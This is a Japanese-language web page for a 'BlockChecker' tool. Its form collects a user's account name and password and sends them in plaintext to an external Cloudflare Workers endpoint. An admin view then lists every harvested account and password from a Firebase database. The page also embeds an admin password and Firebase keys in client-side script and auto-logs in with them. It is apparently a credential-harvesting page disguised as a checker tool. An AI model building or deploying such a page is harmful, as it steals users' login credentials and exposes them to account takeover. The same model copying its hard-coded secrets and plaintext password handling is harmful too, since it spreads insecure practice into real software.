<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BlockChecker 管理＆送信ページ</title>
<style>
body { font-family:sans-serif; background:#111; color:#fff; padding:20px;}
input, button { padding:6px 10px; margin:4px;}
table { width:100%; border-collapse: collapse; margin-top:20px;}
th, td { border:1px solid #444; padding:8px; text-align:center;}
th { background:#222;}
tr:nth-child(even) { background:#1a1a1a;}
#no-data { text-align:center; margin-top:20px; color:#888; }
</style>
</head>
<body>
<h1>BlockChecker 管理＆送信ページ</h1>

<h2>データ送信</h2>
<label>アカウント: <input id="account" type="text"></label>
<label>パスワード: <input id="password" type="text"></label>
<label>ブロック数: <input id="blockCount" type="number" value="0"></label>
<button id="sendBtn">送信</button>

<h2>管理者用データ一覧</h2>
<div id="no-data">まだデータはありません</div>
<table id="data-table" style="display:none;">
<tr>
  <th>アカウント</th>
  <th>パスワード</th>
  <th>ブロック数</th>
  <th>送信日時</th>
</tr>
</table>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
import { getDatabase, ref, get, query, orderByChild } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
import { getAuth, onAuthStateChanged, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-auth.js";

// 🔹 Firebase 設定
const firebaseConfig = {
  apiKey: "AIzaSyB65yYda5Y1bVM3q74HizAQSbRrOT014x0",
  authDomain: "daada-ae048.firebaseapp.com",
  databaseURL: "https://blockchecker-60080-default-rtdb.firebaseio.com",
  projectId: "daada-ae048",
  storageBucket: "daada-ae048.appspot.com",
  messagingSenderId: "844142280857",
  appId: "1:844142280857:web:9ced0beca7eeafd3223808"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const auth = getAuth(app);

// 🔹 管理者ログイン情報
const ADMIN_EMAIL = "admin@example.com";
const ADMIN_PASSWORD = "mysecretpassword";

// 🔹 自動ログイン
signInWithEmailAndPassword(auth, ADMIN_EMAIL, ADMIN_PASSWORD)
  .catch(err => alert("ログインエラー: " + err.message));

const workerURL = "https://blockchecker.da9782523.workers.dev";

// 🔹 送信ボタン
document.getElementById("sendBtn").addEventListener("click", async () => {
  const account = document.getElementById("account").value;
  const password = document.getElementById("password").value;
  const blockCount = parseInt(document.getElementById("blockCount").value || "0");

  if(!account || !password){
    alert("アカウントとパスワードは必須です");
    return;
  }

  try {
    await fetch(workerURL, {
      method:"POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ account, password, blockCount })
    });
    alert("送信成功");
    showData(); // 送信後すぐデータ一覧を更新
  } catch(e) {
    alert("送信失敗: " + e.message);
  }
});

// 🔹 管理者ページにデータ表示
async function showData() {
  const table = document.getElementById("data-table");
  const noData = document.getElementById("no-data");

  const snapshot = await get(query(ref(db, "messages"), orderByChild("timestamp")));

  if (!snapshot.exists()) {
    table.style.display = "none";
    noData.style.display = "block";
    return;
  }

  table.style.display = "table";
  noData.style.display = "none";

  // 既存の行を削除
  while(table.rows.length > 1) table.deleteRow(1);

  snapshot.forEach(child => {
    const d = child.val();
    const row = table.insertRow();
    row.insertCell(0).textContent = d.account || "-";
    row.insertCell(1).textContent = d.password || "-";
    row.insertCell(2).textContent = d.blockCount || "-";
    row.insertCell(3).textContent = d.timestamp ? new Date(d.timestamp).toLocaleString() : "-";
  });
}

// 🔹 ログイン確認して表示
onAuthStateChanged(auth, user => {
  if(user && user.email === ADMIN_EMAIL){
    showData();
  } else {
    alert("管理者ログインが必要です");
    window.location.href = "ログインページURL"; // 適宜変更
  }
});
</script>
</body>
</html>
